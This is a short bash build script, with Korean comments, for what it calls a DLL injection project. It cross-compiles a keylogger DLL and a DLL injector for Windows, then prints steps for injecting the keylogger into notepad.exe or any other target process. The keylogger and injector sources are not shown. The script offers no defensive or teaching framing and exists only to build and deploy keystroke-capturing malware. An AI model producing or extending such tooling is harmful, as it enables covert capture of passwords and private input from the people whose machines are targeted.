#!/bin/bash

echo "==================================="
echo "Building DLL Injection Project"
echo "==================================="

# DLL 컴파일
echo "[1/2] Compiling keylogger DLL..."
x86_64-w64-mingw32-gcc -shared dll/keylogger_dll.c -o dll/keylogger.dll -luser32

# 인젝터 컴파일
echo "[2/2] Compiling DLL injector..."
x86_64-w64-mingw32-gcc injector/dll_injector.c -o injector/injector.exe

echo ""
echo "Build complete!"
echo ""
echo "Generated files:"
ls -lh dll/*.dll injector/*.exe

echo ""
echo "==================================="
echo "Usage:"
echo "1. Run notepad.exe (or any target)"
echo "2. injector.exe notepad.exe [full_path_to_dll]"
echo "==================================="
